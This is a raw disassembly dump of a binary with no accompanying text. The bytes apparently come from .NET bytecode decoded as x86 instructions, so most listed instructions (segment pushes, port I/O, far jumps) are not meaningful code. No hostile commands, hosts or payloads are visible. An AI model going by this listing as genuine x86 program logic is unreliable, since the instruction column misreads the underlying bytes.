  403fe1:	00 00                	add    %al,(%eax)
  403fe3:	04 07                	add    $0x7,%al
  403fe5:	73 ce                	jae    0x403fb5
  403fe7:	00 00                	add    %al,(%eax)
  403fe9:	0a 2a                	or     (%edx),%ch
  403feb:	14 2a                	adc    $0x2a,%al
  403fed:	00 00                	add    %al,(%eax)
  403fef:	00 13                	add    %dl,(%ebx)
  403ff1:	30 06                	xor    %al,(%esi)
  403ff3:	00 4f 00             	add    %cl,0x0(%edi)
  403ff6:	00 00                	add    %al,(%eax)
  403ff8:	0e                   	push   %cs
  403ff9:	00 00                	add    %al,(%eax)
  403ffb:	11 03                	adc    %eax,(%ebx)
  403ffd:	04 0e                	add    $0xe,%al
  403fff:	04 05                	add    $0x5,%al
  404001:	19 17                	sbb    %edx,(%edi)
  404003:	28 02                	sub    %al,(%edx)
  404005:	00 00                	add    %al,(%eax)
  404007:	06                   	push   %es
  404008:	0a 06                	or     (%esi),%al
  40400a:	2c 3d                	sub    $0x3d,%al
  40400c:	73 cb                	jae    0x403fd9
  40400e:	00 00                	add    %al,(%eax)
  404010:	0a 0b                	or     (%ebx),%cl
  404012:	06                   	push   %es
  404013:	7b 22                	jnp    0x404037
  404015:	00 00                	add    %al,(%eax)
  404017:	04 6f                	add    $0x6f,%al
  404019:	cc                   	int3
  40401a:	00 00                	add    %al,(%eax)
  40401c:	0a 0d 16 13 04 2b    	or     0x2b041316,%cl
  404022:	12 09                	adc    (%ecx),%cl
  404024:	11 04 93             	adc    %eax,(%ebx,%edx,4)
  404027:	0c 07                	or     $0x7,%al
  404029:	08 6f cd             	or     %ch,-0x33(%edi)
  40402c:	00 00                	add    %al,(%eax)
  40402e:	0a 11                	or     (%ecx),%dl
  404030:	04 17                	add    $0x17,%al
  404032:	58                   	pop    %eax
  404033:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404036:	04 09                	add    $0x9,%al
  404038:	8e 69 32             	mov    0x32(%ecx),%gs
  40403b:	e7 06                	out    %eax,$0x6
  40403d:	7b 21                	jnp    0x404060
  40403f:	00 00                	add    %al,(%eax)
  404041:	04 07                	add    $0x7,%al
  404043:	73 ce                	jae    0x404013
  404045:	00 00                	add    %al,(%eax)
  404047:	0a 2a                	or     (%edx),%ch
  404049:	14 2a                	adc    $0x2a,%al
  40404b:	1e                   	push   %ds
  40404c:	02 7b 41             	add    0x41(%ebx),%bh
  40404f:	00 00                	add    %al,(%eax)
  404051:	04 2a                	add    $0x2a,%al
  404053:	00 13                	add    %dl,(%ebx)
  404055:	30 03                	xor    %al,(%ebx)
  404057:	00 24 00             	add    %ah,(%eax,%eax,1)
  40405a:	00 00                	add    %al,(%eax)
  40405c:	0f 00 00             	sldt   (%eax)
  40405f:	11 72 01             	adc    %esi,0x1(%edx)
  404062:	00 00                	add    %al,(%eax)
  404064:	70 0a                	jo     0x404070
  404066:	02 7b 4c             	add    0x4c(%ebx),%bh
  404069:	00 00                	add    %al,(%eax)
  40406b:	04 02                	add    $0x2,%al
  40406d:	7b 4d                	jnp    0x4040bc
  40406f:	00 00                	add    %al,(%eax)
  404071:	04 12                	add    $0x12,%al
  404073:	00 28                	add    %ch,(%eax)
  404075:	21 00                	and    %eax,(%eax)
  404077:	00 06                	add    %al,(%esi)
  404079:	17                   	pop    %ss
  40407a:	33 02                	xor    (%edx),%eax
  40407c:	06                   	push   %es
  40407d:	2a 72 01             	sub    0x1(%edx),%dh
  404080:	00 00                	add    %al,(%eax)
  404082:	70 2a                	jo     0x4040ae
  404084:	13 30                	adc    (%eax),%esi
  404086:	03 00                	add    (%eax),%eax
  404088:	70 00                	jo     0x40408a
  40408a:	00 00                	add    %al,(%eax)
  40408c:	10 00                	adc    %al,(%eax)
  40408e:	00 11                	add    %dl,(%ecx)
  404090:	73 cb                	jae    0x40405d
  404092:	00 00                	add    %al,(%eax)
  404094:	0a 0a                	or     (%edx),%cl
  404096:	17                   	pop    %ss
  404097:	28 cf                	sub    %cl,%bh
  404099:	00 00                	add    %al,(%eax)
  40409b:	0a 0b                	or     (%ebx),%cl
  40409d:	12 01                	adc    (%ecx),%al
  40409f:	28 d0                	sub    %dl,%al
  4040a1:	00 00                	add    %al,(%eax)
  4040a3:	0a 1f                	or     (%edi),%bl
  4040a5:	0d 33 07 28 d1       	or     $0xd1280733,%eax
  4040aa:	00 00                	add    %al,(%eax)
  4040ac:	0a 2b                	or     (%ebx),%ch
  4040ae:	4f                   	dec    %edi
  4040af:	12 01                	adc    (%ecx),%al
  4040b1:	28 d0                	sub    %dl,%al
  4040b3:	00 00                	add    %al,(%eax)
  4040b5:	0a 1e                	or     (%esi),%bl
  4040b7:	33 23                	xor    (%ebx),%esp
  4040b9:	06                   	push   %es
  4040ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4040bb:	d2 00                	rolb   %cl,(%eax)
  4040bd:	00 0a                	add    %cl,(%edx)
  4040bf:	16                   	push   %ss
  4040c0:	31 d4                	xor    %edx,%esp
  4040c2:	06                   	push   %es
  4040c3:	06                   	push   %es
  4040c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4040c5:	d2 00                	rolb   %cl,(%eax)
  4040c7:	00 0a                	add    %cl,(%edx)
  4040c9:	17                   	pop    %ss
  4040ca:	59                   	pop    %ecx
  4040cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4040cc:	d3 00                	roll   %cl,(%eax)
  4040ce:	00 0a                	add    %cl,(%edx)
  4040d0:	72 49                	jb     0x40411b
  4040d2:	02 00                	add    (%eax),%al
  4040d4:	70 28                	jo     0x4040fe
  4040d6:	d4 00                	aam    $0x0
  4040d8:	00 0a                	add    %cl,(%edx)
  4040da:	2b ba 12 01 28 d5    	sub    -0x2ad7feee(%edx),%edi
  4040e0:	00 00                	add    %al,(%eax)
  4040e2:	0a 2c b1             	or     (%ecx,%esi,4),%ch
  4040e5:	06                   	push   %es
  4040e6:	12 01                	adc    (%ecx),%al
  4040e8:	28 d5                	sub    %dl,%ch
  4040ea:	00 00                	add    %al,(%eax)
  4040ec:	0a 6f cd             	or     -0x33(%edi),%ch
  4040ef:	00 00                	add    %al,(%eax)
  4040f1:	0a 72 51             	or     0x51(%edx),%dh
  4040f4:	02 00                	add    (%eax),%al
  4040f6:	70 28                	jo     0x404120
  4040f8:	d4 00                	aam    $0x0
  4040fa:	00 0a                	add    %cl,(%edx)
  4040fc:	2b 98 06 2a 13 30    	sub    0x30132a06(%eax),%ebx
  404102:	04 00                	add    $0x0,%al
  404104:	4c                   	dec    %esp
  404105:	00 00                	add    %al,(%eax)
  404107:	00 11                	add    %dl,(%ecx)
  404109:	00 00                	add    %al,(%eax)
  40410b:	11 73 cb             	adc    %esi,-0x35(%ebx)
  40410e:	00 00                	add    %al,(%eax)
  404110:	0a 0a                	or     (%edx),%cl
  404112:	72 01                	jb     0x404115
  404114:	00 00                	add    %al,(%eax)
  404116:	70 0b                	jo     0x404123
  404118:	02 7b 4c             	add    0x4c(%ebx),%bh
  40411b:	00 00                	add    %al,(%eax)
  40411d:	04 02                	add    $0x2,%al
  40411f:	7b 4d                	jnp    0x40416e
  404121:	00 00                	add    %al,(%eax)
  404123:	04 12                	add    $0x12,%al
  404125:	01 17                	add    %edx,(%edi)
  404127:	28 20                	sub    %ah,(%eax)
  404129:	00 00                	add    %al,(%eax)
  40412b:	06                   	push   %es
  40412c:	17                   	pop    %ss
  40412d:	33 27                	xor    (%edi),%esp
  40412f:	07                   	pop    %es
  404130:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  404135:	16                   	push   %ss
  404136:	09 11                	or     %edx,(%ecx)
  404138:	04 6f                	add    $0x6f,%al
  40413a:	6d                   	insl   (%dx),%es:(%edi)
  40413b:	00 00                	add    %al,(%eax)
  40413d:	0a 0c 06             	or     (%esi,%eax,1),%cl
  404140:	08 6f cd             	or     %ch,-0x33(%edi)
  404143:	00 00                	add    %al,(%eax)
  404145:	0a 11                	or     (%ecx),%dl
  404147:	04 17                	add    $0x17,%al
  404149:	58                   	pop    %eax
  40414a:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40414d:	04 09                	add    $0x9,%al
  40414f:	6f                   	outsl  %ds:(%esi),(%dx)
  404150:	d6                   	salc
  404151:	00 00                	add    %al,(%eax)
  404153:	0a 32                	or     (%edx),%dh
  404155:	e0 06                	loopne 0x40415d
  404157:	2a 06                	sub    (%esi),%al
  404159:	2a 06                	sub    (%esi),%al
  40415b:	2a 06                	sub    (%esi),%al
  40415d:	2a 06                	sub    (%esi),%al
  40415f:	2a 06                	sub    (%esi),%al
  404161:	2a 06                	sub    (%esi),%al
  404163:	2a 06                	sub    (%esi),%al
  404165:	2a 00                	sub    (%eax),%al
  404167:	00 03                	add    %al,(%ebx)
  404169:	30 02                	xor    %al,(%edx)
  40416b:	00 58 00             	add    %bl,0x0(%eax)
  40416e:	00 00                	add    %al,(%eax)
  404170:	00 00                	add    %al,(%eax)
  404172:	00 00                	add    %al,(%eax)
  404174:	02 7b 4e             	add    0x4e(%ebx),%bh
  404177:	00 00                	add    %al,(%eax)
  404179:	04 2d                	add    $0x2d,%al
  40417b:	26 04 6f             	es add $0x6f,%al
  40417e:	95                   	xchg   %eax,%ebp
  40417f:	00 00                	add    %al,(%eax)
  404181:	0a 17                	or     (%edi),%dl
  404183:	33 01                	xor    (%ecx),%eax
  404185:	2a 02                	sub    (%edx),%al
  404187:	02 7b 4a             	add    0x4a(%ebx),%bh
  40418a:	00 00                	add    %al,(%eax)
  40418c:	04 73                	add    $0x73,%al
  40418e:	32 00                	xor    (%eax),%al
  404190:	00 06                	add    %al,(%esi)
  404192:	7d 4e                	jge    0x4041e2
  404194:	00 00                	add    %al,(%eax)
  404196:	04 02                	add    $0x2,%al
  404198:	7b 4e                	jnp    0x4041e8
  40419a:	00 00                	add    %al,(%eax)
  40419c:	04 6f                	add    $0x6f,%al
  40419e:	d7                   	xlat   %ds:(%ebx)
  40419f:	00 00                	add    %al,(%eax)
  4041a1:	0a 02                	or     (%edx),%al
  4041a3:	7b 4e                	jnp    0x4041f3
  4041a5:	00 00                	add    %al,(%eax)
  4041a7:	04 04                	add    $0x4,%al
  4041a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4041aa:	33 00                	xor    (%eax),%eax
  4041ac:	00 06                	add    %al,(%esi)
  4041ae:	04 6f                	add    $0x6f,%al
  4041b0:	95                   	xchg   %eax,%ebp
  4041b1:	00 00                	add    %al,(%eax)
  4041b3:	0a 17                	or     (%edi),%dl
  4041b5:	33 14 02             	xor    (%edx,%eax,1),%edx
  4041b8:	7b 4e                	jnp    0x404208
  4041ba:	00 00                	add    %al,(%eax)
  4041bc:	04 6f                	add    $0x6f,%al
  4041be:	30 00                	xor    %al,(%eax)
  4041c0:	00 06                	add    %al,(%esi)
  4041c2:	2d 07 02 14 7d       	sub    $0x7d140207,%eax
  4041c7:	4e                   	dec    %esi
  4041c8:	00 00                	add    %al,(%eax)
  4041ca:	04 2a                	add    $0x2a,%al
  4041cc:	06                   	push   %es
  4041cd:	2a 06                	sub    (%esi),%al
  4041cf:	2a 03                	sub    (%ebx),%al
  4041d1:	30 02                	xor    %al,(%edx)
  4041d3:	00 40 00             	add    %al,0x0(%eax)
  4041d6:	00 00                	add    %al,(%eax)
  4041d8:	00 00                	add    %al,(%eax)
  4041da:	00 00                	add    %al,(%eax)
  4041dc:	02 28                	add    (%eax),%ch
  4041de:	d8 00                	fadds  (%eax)
  4041e0:	00 0a                	add    %cl,(%edx)
  4041e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4041e3:	d9 00                	flds   (%eax)
  4041e5:	00 0a                	add    %cl,(%edx)
  4041e7:	7d 51                	jge    0x40423a
  4041e9:	00 00                	add    %al,(%eax)
  4041eb:	04 02                	add    $0x2,%al
  4041ed:	28 d8                	sub    %bl,%al
  4041ef:	00 00                	add    %al,(%eax)
  4041f1:	0a 6f da             	or     -0x26(%edi),%ch
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	0a 7d 52             	or     0x52(%ebp),%bh
  4041f9:	00 00                	add    %al,(%eax)
  4041fb:	04 02                	add    $0x2,%al
  4041fd:	28 db                	sub    %bl,%bl
  4041ff:	00 00                	add    %al,(%eax)
  404201:	0a 7d 53             	or     0x53(%ebp),%bh
  404204:	00 00                	add    %al,(%eax)
  404206:	04 02                	add    $0x2,%al
  404208:	28 dc                	sub    %bl,%ah
  40420a:	00 00                	add    %al,(%eax)
  40420c:	0a 02                	or     (%edx),%al
  40420e:	03 7d 4f             	add    0x4f(%ebp),%edi
  404211:	00 00                	add    %al,(%eax)
  404213:	04 02                	add    $0x2,%al
  404215:	04 7d                	add    $0x7d,%al
  404217:	50                   	push   %eax
  404218:	00 00                	add    %al,(%eax)
  40421a:	04 2a                	add    $0x2a,%al
  40421c:	13 30                	adc    (%eax),%esi
  40421e:	03 00                	add    (%eax),%eax
  404220:	2e 00 00             	add    %al,%cs:(%eax)
  404223:	00 12                	add    %dl,(%edx)
  404225:	00 00                	add    %al,(%eax)
  404227:	11 02                	adc    %eax,(%edx)
  404229:	7b 50                	jnp    0x40427b
  40422b:	00 00                	add    %al,(%eax)
  40422d:	04 2d                	add    $0x2d,%al
  40422f:	02 14 2a             	add    (%edx,%ebp,1),%dl
  404232:	02 7b 54             	add    0x54(%ebx),%bh
  404235:	00 00                	add    %al,(%eax)
  404237:	04 25                	add    $0x25,%al
  404239:	2d 1a 26 02 02       	sub    $0x202261a,%eax
  40423e:	7b 50                	jnp    0x404290
  404240:	00 00                	add    %al,(%eax)
  404242:	04 73                	add    $0x73,%al
  404244:	5a                   	pop    %edx
  404245:	00 00                	add    %al,(%eax)
  404247:	06                   	push   %es
  404248:	28 dd                	sub    %bl,%ch
  40424a:	00 00                	add    %al,(%eax)
  40424c:	0a 25 0a 7d 54 00    	or     0x547d0a,%ah
  404252:	00 04 06             	add    %al,(%esi,%eax,1)
  404255:	2a 1e                	sub    (%esi),%bl
  404257:	02 7b 51             	add    0x51(%ebx),%bh
  40425a:	00 00                	add    %al,(%eax)
  40425c:	04 2a                	add    $0x2a,%al
  40425e:	1e                   	push   %ds
  40425f:	02 7b 52             	add    0x52(%ebx),%bh
  404262:	00 00                	add    %al,(%eax)
  404264:	04 2a                	add    $0x2a,%al
  404266:	1e                   	push   %ds
  404267:	02 7b 53             	add    0x53(%ebx),%bh
  40426a:	00 00                	add    %al,(%eax)
  40426c:	04 2a                	add    $0x2a,%al
  40426e:	1a 72 55             	sbb    0x55(%edx),%dh
  404271:	02 00                	add    (%eax),%al
  404273:	70 2a                	jo     0x40429f
  404275:	1e                   	push   %ds
  404276:	02 7b 50             	add    0x50(%ebx),%bh
  404279:	00 00                	add    %al,(%eax)
  40427b:	04 2a                	add    $0x2a,%al
  40427d:	2e 16                	cs push %ss
  40427f:	1b 16                	sbb    (%esi),%edx
  404281:	1f                   	pop    %ds
  404282:	1d 73 de 00 00       	sbb    $0xde73,%eax
  404287:	0a 2a                	or     (%edx),%ch
  404289:	06                   	push   %es
  40428a:	2a 06                	sub    (%esi),%al
  40428c:	2a 06                	sub    (%esi),%al
  40428e:	2a 06                	sub    (%esi),%al
  404290:	2a 66 02             	sub    0x2(%esi),%ah
  404293:	7b 4f                	jnp    0x4042e4
  404295:	00 00                	add    %al,(%eax)
  404297:	04 17                	add    $0x17,%al
  404299:	6f                   	outsl  %ds:(%esi),(%dx)
  40429a:	70 00                	jo     0x40429c
  40429c:	00 06                	add    %al,(%esi)
  40429e:	02 7b 4f             	add    0x4f(%ebx),%bh
  4042a1:	00 00                	add    %al,(%eax)
  4042a3:	04 03                	add    $0x3,%al
  4042a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4042a6:	72 00                	jb     0x4042a8
  4042a8:	00 06                	add    %al,(%esi)
  4042aa:	2a 72 02             	sub    0x2(%edx),%dh
  4042ad:	28 13                	sub    %dl,(%ebx)
  4042af:	00 00                	add    %al,(%eax)
  4042b1:	0a 03                	or     (%ebx),%al
  4042b3:	2d 0b 72 75 02       	sub    $0x275720b,%eax
  4042b8:	00 70 73             	add    %dh,0x73(%eax)
  4042bb:	df 00                	filds  (%eax)
  4042bd:	00 0a                	add    %cl,(%edx)
  4042bf:	7a 02                	jp     0x4042c3
  4042c1:	03 7d 55             	add    0x55(%ebp),%edi
  4042c4:	00 00                	add    %al,(%eax)
  4042c6:	04 2a                	add    $0x2a,%al
  4042c8:	32 02                	xor    (%edx),%al
  4042ca:	7b 55                	jnp    0x404321
  4042cc:	00 00                	add    %al,(%eax)
  4042ce:	04 7b                	add    $0x7b,%al
  4042d0:	42                   	inc    %edx
  4042d1:	00 00                	add    %al,(%eax)
  4042d3:	04 2a                	add    $0x2a,%al
  4042d5:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  4042d9:	00 00                	add    %al,(%eax)
  4042db:	04 03                	add    $0x3,%al
  4042dd:	7d 42                	jge    0x404321
  4042df:	00 00                	add    %al,(%eax)
  4042e1:	04 2a                	add    $0x2a,%al
  4042e3:	32 02                	xor    (%edx),%al
  4042e5:	7b 55                	jnp    0x40433c
  4042e7:	00 00                	add    %al,(%eax)
  4042e9:	04 7b                	add    $0x7b,%al
  4042eb:	43                   	inc    %ebx
  4042ec:	00 00                	add    %al,(%eax)
  4042ee:	04 2a                	add    $0x2a,%al
  4042f0:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  4042f4:	00 00                	add    %al,(%eax)
  4042f6:	04 03                	add    $0x3,%al
  4042f8:	7d 43                	jge    0x40433d
  4042fa:	00 00                	add    %al,(%eax)
  4042fc:	04 2a                	add    $0x2a,%al
  4042fe:	32 02                	xor    (%edx),%al
  404300:	7b 55                	jnp    0x404357
  404302:	00 00                	add    %al,(%eax)
  404304:	04 7b                	add    $0x7b,%al
  404306:	44                   	inc    %esp
  404307:	00 00                	add    %al,(%eax)
  404309:	04 2a                	add    $0x2a,%al
  40430b:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  40430f:	00 00                	add    %al,(%eax)
  404311:	04 03                	add    $0x3,%al
  404313:	7d 44                	jge    0x404359
  404315:	00 00                	add    %al,(%eax)
  404317:	04 2a                	add    $0x2a,%al
  404319:	32 02                	xor    (%edx),%al
  40431b:	7b 55                	jnp    0x404372
  40431d:	00 00                	add    %al,(%eax)
  40431f:	04 7b                	add    $0x7b,%al
  404321:	45                   	inc    %ebp
  404322:	00 00                	add    %al,(%eax)
  404324:	04 2a                	add    $0x2a,%al
  404326:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  40432a:	00 00                	add    %al,(%eax)
  40432c:	04 03                	add    $0x3,%al
  40432e:	7d 45                	jge    0x404375
  404330:	00 00                	add    %al,(%eax)
  404332:	04 2a                	add    $0x2a,%al
  404334:	32 02                	xor    (%edx),%al
  404336:	7b 55                	jnp    0x40438d
  404338:	00 00                	add    %al,(%eax)
  40433a:	04 7b                	add    $0x7b,%al
  40433c:	46                   	inc    %esi
  40433d:	00 00                	add    %al,(%eax)
  40433f:	04 2a                	add    $0x2a,%al
  404341:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  404345:	00 00                	add    %al,(%eax)
  404347:	04 03                	add    $0x3,%al
  404349:	7d 46                	jge    0x404391
  40434b:	00 00                	add    %al,(%eax)
  40434d:	04 2a                	add    $0x2a,%al
  40434f:	32 02                	xor    (%edx),%al
  404351:	7b 55                	jnp    0x4043a8
  404353:	00 00                	add    %al,(%eax)
  404355:	04 7b                	add    $0x7b,%al
  404357:	47                   	inc    %edi
  404358:	00 00                	add    %al,(%eax)
  40435a:	04 2a                	add    $0x2a,%al
  40435c:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  404360:	00 00                	add    %al,(%eax)
  404362:	04 03                	add    $0x3,%al
  404364:	7d 47                	jge    0x4043ad
  404366:	00 00                	add    %al,(%eax)
  404368:	04 2a                	add    $0x2a,%al
  40436a:	32 02                	xor    (%edx),%al
  40436c:	7b 55                	jnp    0x4043c3
  40436e:	00 00                	add    %al,(%eax)
  404370:	04 7b                	add    $0x7b,%al
  404372:	48                   	dec    %eax
  404373:	00 00                	add    %al,(%eax)
  404375:	04 2a                	add    $0x2a,%al
  404377:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  40437b:	00 00                	add    %al,(%eax)
  40437d:	04 03                	add    $0x3,%al
  40437f:	7d 48                	jge    0x4043c9
  404381:	00 00                	add    %al,(%eax)
  404383:	04 2a                	add    $0x2a,%al
  404385:	32 02                	xor    (%edx),%al
  404387:	7b 55                	jnp    0x4043de
  404389:	00 00                	add    %al,(%eax)
  40438b:	04 7b                	add    $0x7b,%al
  40438d:	49                   	dec    %ecx
  40438e:	00 00                	add    %al,(%eax)
  404390:	04 2a                	add    $0x2a,%al
  404392:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  404396:	00 00                	add    %al,(%eax)
  404398:	04 03                	add    $0x3,%al
  40439a:	7d 49                	jge    0x4043e5
  40439c:	00 00                	add    %al,(%eax)
  40439e:	04 2a                	add    $0x2a,%al
  4043a0:	32 02                	xor    (%edx),%al
  4043a2:	7b 55                	jnp    0x4043f9
  4043a4:	00 00                	add    %al,(%eax)
  4043a6:	04 7b                	add    $0x7b,%al
  4043a8:	4a                   	dec    %edx
  4043a9:	00 00                	add    %al,(%eax)
  4043ab:	04 2a                	add    $0x2a,%al
  4043ad:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  4043b1:	00 00                	add    %al,(%eax)
  4043b3:	04 03                	add    $0x3,%al
  4043b5:	7d 4a                	jge    0x404401
  4043b7:	00 00                	add    %al,(%eax)
  4043b9:	04 2a                	add    $0x2a,%al
  4043bb:	32 02                	xor    (%edx),%al
  4043bd:	7b 55                	jnp    0x404414
  4043bf:	00 00                	add    %al,(%eax)
  4043c1:	04 7b                	add    $0x7b,%al
  4043c3:	4b                   	dec    %ebx
  4043c4:	00 00                	add    %al,(%eax)
  4043c6:	04 2a                	add    $0x2a,%al
  4043c8:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  4043cc:	00 00                	add    %al,(%eax)
  4043ce:	04 03                	add    $0x3,%al
  4043d0:	7d 4b                	jge    0x40441d
  4043d2:	00 00                	add    %al,(%eax)
  4043d4:	04 2a                	add    $0x2a,%al
  4043d6:	1e                   	push   %ds
  4043d7:	02 7b 56             	add    0x56(%ebx),%bh
  4043da:	00 00                	add    %al,(%eax)
  4043dc:	04 2a                	add    $0x2a,%al
  4043de:	22 02                	and    (%edx),%al
  4043e0:	03 7d 56             	add    0x56(%ebp),%edi
  4043e3:	00 00                	add    %al,(%eax)
  4043e5:	04 2a                	add    $0x2a,%al
  4043e7:	1e                   	push   %ds
  4043e8:	02 7b 57             	add    0x57(%ebx),%bh
  4043eb:	00 00                	add    %al,(%eax)
  4043ed:	04 2a                	add    $0x2a,%al
  4043ef:	22 02                	and    (%edx),%al
  4043f1:	03 7d 57             	add    0x57(%ebp),%edi
  4043f4:	00 00                	add    %al,(%eax)
  4043f6:	04 2a                	add    $0x2a,%al
  4043f8:	1e                   	push   %ds
  4043f9:	02 28                	add    (%eax),%ch
  4043fb:	13 00                	adc    (%eax),%eax
  4043fd:	00 0a                	add    %cl,(%edx)
  4043ff:	2a 9e 02 7b 58 00    	sub    0x587b02(%esi),%bl
  404405:	00 04 03             	add    %al,(%ebx,%eax,1)
  404408:	74 08                	je     0x404412
  40440a:	00 00                	add    %al,(%eax)
  40440c:	1b 04 6f             	sbb    (%edi,%ebp,2),%eax
  40440f:	e1 00                	loope  0x404411
  404411:	00 0a                	add    %cl,(%edx)
  404413:	6f                   	outsl  %ds:(%esi),(%dx)
  404414:	e2 00                	loop   0x404416
  404416:	00 0a                	add    %cl,(%edx)
  404418:	6f                   	outsl  %ds:(%esi),(%dx)
  404419:	e3 00                	jecxz  0x40441b
  40441b:	00 0a                	add    %cl,(%edx)
  40441d:	6f                   	outsl  %ds:(%esi),(%dx)
  40441e:	e4 00                	in     $0x0,%al
  404420:	00 0a                	add    %cl,(%edx)
  404422:	6f                   	outsl  %ds:(%esi),(%dx)
  404423:	e5 00                	in     $0x0,%eax
  404425:	00 0a                	add    %cl,(%edx)
  404427:	2a 8a 02 7b 58 00    	sub    0x587b02(%edx),%cl
  40442d:	00 04 03             	add    %al,(%ebx,%eax,1)
  404430:	74 09                	je     0x40443b
  404432:	00 00                	add    %al,(%eax)
  404434:	1b 04 6f             	sbb    (%edi,%ebp,2),%eax
  404437:	e1 00                	loope  0x404439
  404439:	00 0a                	add    %cl,(%edx)
  40443b:	6f                   	outsl  %ds:(%esi),(%dx)
  40443c:	e6 00                	out    %al,$0x0
  40443e:	00 0a                	add    %cl,(%edx)
  404440:	6f                   	outsl  %ds:(%esi),(%dx)
  404441:	12 00                	adc    (%eax),%al
  404443:	00 0a                	add    %cl,(%edx)
  404445:	6f                   	outsl  %ds:(%esi),(%dx)
  404446:	c6 00 00             	movb   $0x0,(%eax)
  404449:	0a 2a                	or     (%edx),%ch
  40444b:	56                   	push   %esi
  40444c:	03 6f e7             	add    -0x19(%edi),%ebp
  40444f:	00 00                	add    %al,(%eax)
  404451:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  404454:	02 7b 59             	add    0x59(%ebx),%bh
  404457:	00 00                	add    %al,(%eax)
  404459:	04 6f                	add    $0x6f,%al
  40445b:	e8 00 00 0a 26       	call   0x264a4460
  404460:	2a 00                	sub    (%eax),%al
  404462:	00 00                	add    %al,(%eax)
  404464:	1b 30                	sbb    (%eax),%esi
  404466:	06                   	push   %es
  404467:	00 fe                	add    %bh,%dh
  404469:	04 00                	add    $0x0,%al
  40446b:	00 13                	add    %dl,(%ebx)
  40446d:	00 00                	add    %al,(%eax)
  40446f:	11 14 13             	adc    %edx,(%ebx,%edx,1)
  404472:	16                   	push   %ss
  404473:	14 13                	adc    $0x13,%al
  404475:	17                   	pop    %ss
  404476:	14 13                	adc    $0x13,%al
  404478:	18 73 7a             	sbb    %dh,0x7a(%ebx)
  40447b:	00 00                	add    %al,(%eax)
  40447d:	06                   	push   %es
  40447e:	13 19                	adc    (%ecx),%ebx
  404480:	28 e9                	sub    %ch,%cl
  404482:	00 00                	add    %al,(%eax)
  404484:	0a 73 79             	or     0x79(%ebx),%dh
  404487:	00 00                	add    %al,(%eax)
  404489:	06                   	push   %es
  40448a:	0a 16                	or     (%esi),%dl
  40448c:	0b 7e 16             	or     0x16(%esi),%edi
  40448f:	00 00                	add    %al,(%eax)
  404491:	0a 0c 11             	or     (%ecx,%edx,1),%cl
  404494:	19 73 3a             	sbb    %esi,0x3a(%ebx)
  404497:	00 00                	add    %al,(%eax)
  404499:	06                   	push   %es
  40449a:	7d 58                	jge    0x4044f4
  40449c:	00 00                	add    %al,(%eax)
  40449e:	04 06                	add    $0x6,%al
  4044a0:	11 19                	adc    %ebx,(%ecx)
  4044a2:	7b 58                	jnp    0x4044fc
  4044a4:	00 00                	add    %al,(%eax)
  4044a6:	04 73                	add    $0x73,%al
  4044a8:	4d                   	dec    %ebp
  4044a9:	00 00                	add    %al,(%eax)
  4044ab:	06                   	push   %es
  4044ac:	0d 11 19 16 73       	or     $0x73161911,%eax
  4044b1:	ea 00 00 0a 7d 59 00 	ljmp   $0x59,$0x7d0a0000
  4044b8:	00 04 28             	add    %al,(%eax,%ebp,1)
  4044bb:	29 00                	sub    %eax,(%eax)
  4044bd:	00 0a                	add    %cl,(%edx)
  4044bf:	14 fe                	adc    $0xfe,%al
  4044c1:	06                   	push   %es
  4044c2:	78 00                	js     0x4044c4
  4044c4:	00 06                	add    %al,(%esi)
  4044c6:	73 eb                	jae    0x4044b3
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	0a 6f ec             	or     -0x14(%edi),%ch
  4044cd:	00 00                	add    %al,(%eax)
  4044cf:	0a 09                	or     (%ecx),%cl
  4044d1:	28 ed                	sub    %ch,%ch
  4044d3:	00 00                	add    %al,(%eax)
  4044d5:	0a 13                	or     (%ebx),%dl
  4044d7:	04 11                	add    $0x11,%al
  4044d9:	04 16                	add    $0x16,%al
  4044db:	6f                   	outsl  %ds:(%esi),(%dx)
  4044dc:	ee                   	out    %al,(%dx)
  4044dd:	00 00                	add    %al,(%eax)
  4044df:	0a 11                	or     (%ecx),%dl
  4044e1:	04 6f                	add    $0x6f,%al
  4044e3:	ef                   	out    %eax,(%dx)
  4044e4:	00 00                	add    %al,(%eax)
  4044e6:	0a 28                	or     (%eax),%ch
  4044e8:	f0 00 00             	lock add %al,(%eax)
  4044eb:	0a 13                	or     (%ebx),%dl
  4044ed:	05 11 05 11 04       	add    $0x4110511,%eax
  4044f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4044f3:	f1                   	int1
  4044f4:	00 00                	add    %al,(%eax)
  4044f6:	0a 11                	or     (%ecx),%dl
  4044f8:	05 6f f2 00 00       	add    $0xf26f,%eax
  4044fd:	0a 6f f3             	or     -0xd(%edi),%ch
  404500:	00 00                	add    %al,(%eax)
  404502:	0a 11                	or     (%ecx),%dl
  404504:	16                   	push   %ss
  404505:	2d 0f 11 19 fe       	sub    $0xfe19110f,%eax
  40450a:	06                   	push   %es
  40450b:	7b 00                	jnp    0x40450d
  40450d:	00 06                	add    %al,(%esi)
  40450f:	73 f4                	jae    0x404505
  404511:	00 00                	add    %al,(%eax)
  404513:	0a 13                	or     (%ebx),%dl
  404515:	16                   	push   %ss
  404516:	11 16                	adc    %edx,(%esi)
  404518:	6f                   	outsl  %ds:(%esi),(%dx)
  404519:	f5                   	cmc
  40451a:	00 00                	add    %al,(%eax)
  40451c:	0a 73 f6             	or     -0xa(%ebx),%dh
  40451f:	00 00                	add    %al,(%eax)
  404521:	0a 13                	or     (%ebx),%dl
  404523:	06                   	push   %es
